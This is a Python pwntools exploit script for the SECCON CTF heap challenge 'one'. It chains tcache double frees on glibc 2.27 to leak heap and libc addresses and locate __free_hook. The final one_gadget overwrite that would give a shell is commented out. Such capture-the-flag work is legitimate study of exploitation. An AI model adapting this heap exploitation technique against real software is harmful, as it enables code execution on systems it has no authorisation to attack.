#!/usr/bin/env python
from pwn import *


conn = process("./one_ef36d5ef6169aeda65259f627f282930b93cf6e5")
# conn = remote("one.chal.seccon.jp", 18357)
# conn = remote("localhost", 3000)
elf = ELF("./one_ef36d5ef6169aeda65259f627f282930b93cf6e5")
libc = ELF("./libc-2.27.so_18292bd12d37bfaf58e8dded9db7f1f5da1192cb")
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]


def menu():
    conn.recvuntil("> ")


def add(name):
    menu()
    log.info("Add " + str(name))
    conn.sendline("1")
    conn.sendline(name)


def show():
    menu()
    conn.sendline("2")


def delete():
    menu()
    conn.sendline("3")


def exit():
    menu()
    conn.sendline("0")


def main():
    a = raw_input()
    add("A" * 8)
    conn.recvuntil("Done.")

    delete()
    delete()  # double free

    show()

    heap_addr = u64(conn.recv(6) + "\x00\x00")  # 0x555555758270
    log.info("heap_addr: " + hex(heap_addr))

    # padding add
    add("B" * 8)
    conn.recvuntil("Done.")

    fake_chunk = p64(heap_addr)  # AAAAAAAA BBBBBBBB
    fake_chunk += p64(0x91)  # prev_size

    add(fake_chunk)
    delete()
    delete()  # double free
    log.info("fake_chunk double free")

    fake_chunk = p64(heap_addr + 0x10)  # AAAAAAAA BBBBBBBB
    fake_chunk += p64(0x91)  # prev_size

    # add(p64(heap_addr + 0x10))
    add(fake_chunk)
    conn.recvuntil("Done.")
    log.info("add(heap_addr + 0x10)")

    add("B")  # padding
    conn.recvuntil("Done.")

    add("C")  # get the addr of fake_chunk
    conn.recvuntil("Done.")

    # # link to unsorted_bin
    for i in range(8):
        delete()

    show()
    leak_addr = u64(conn.recv(6) + "\x00\x00")
    libc_base = leak_addr - libc.symbols["puts"]
    free_hook = libc_base + libc.symbols["__free_hook"]
    log.info("libc_base: " + hex(libc_base))
    log.info("free_hook: " + hex(free_hook))

    # log.info(conn.recvuntil("Done."))
    #
    # add(p64(memo_addr))
    # delete()
    # delete()
    #
    # print conn.recvuntil("\n")
    # print "second double free"
    # print conn.recvuntil("\n")
    # print conn.recvuntil("\n")
    #
    # add(p64(free_hook))
    # conn.recvuntil("Done.")
    #
    # add(p64(memo_addr))
    # conn.recvuntil("Done.")
    #
    # add(p64(one_gadget[1] + libc_base))
    # conn.recvuntil("Done.")
    #
    # delete()
    # conn.interactive()


if __name__ == "__main__":
    main()
